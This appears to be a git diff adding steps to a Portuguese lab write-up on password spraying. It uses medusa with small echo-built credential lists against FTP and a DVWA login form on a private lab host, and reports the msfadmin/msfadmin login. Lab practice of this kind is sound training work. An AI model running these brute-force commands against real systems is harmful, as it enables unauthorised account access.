@@ -32,4 +32,47 @@ Para validar se o serviço está mesmo ativo vamos testá-lo diretamente com o c
 ftp 192.168.15.43
 
 Onde obtivemos o seguinte retorno:
+
 <img width="273" height="114" alt="image" src="https://github.com/user-attachments/assets/af5eb11c-4620-4153-afde-443070d3fe7c" />
+
+O que significa que o serviço está mesmo disponível para exploração.
+
+c)Criar usuários e senhas comuns para realizar o Password Spraying:
+  Vamos primeiramente criar o arquivo correspondente aos nomes de usuários com o comando echo
+
+  echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
+
+  E agora definir as senhas que serão utilizadas para o ataque
+
+  echo -e "123456\npassword\nquerty\nmsfadmin" > pass.txt
+
+  Com os arquivos devidamente criados, utilizaremos o comando medusa para o ataque:
+
+  medusa -h 192.168.15.43 -U users.txt -P pass.txt -M ftp -t 6
+  
+<img width="1410" height="378" alt="image" src="https://github.com/user-attachments/assets/eeba8e70-556a-49b8-aedc-e371dc9f16ea" />
+
+Obtivemos então, sucesso ao acessar o serviço utilizando o usuário: msfadmin e a senha: msfadmin.
+
+2. Automação de tentativas de usuários e senhas em serviços WEB
+   a)Acessamos primeiramente o DVWA ao abrir o navegador e inserir o endereço:
+   
+   192.168.15.43/dvwa
+   
+  E utilizaremos as listas de usuários e senhas:
+
+  echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
+
+  echo -e "123456\npassword\nquerty\nmsfadmin" > pass.txt
+
+  Vamos então iniciar o ataque com medusa:
+
+    medusa -h 192.168.15.43 -U users.txt -P pass.txt -M http \
+    -m PAGE: '/dvwa/login.php' \
+    -m FORM: 'username=^USER^&password=^PASS^&Login=Login' \
+    -m 'FAIL=Login Failed' -t 6
+    
+<img width="1423" height="827" alt="image" src="https://github.com/user-attachments/assets/644e1297-2f04-4acf-8803-c63cbf4d9b0a" />
+
+Com esse ataque conseguimos todos os usuários e senhas válidos para login.
+  
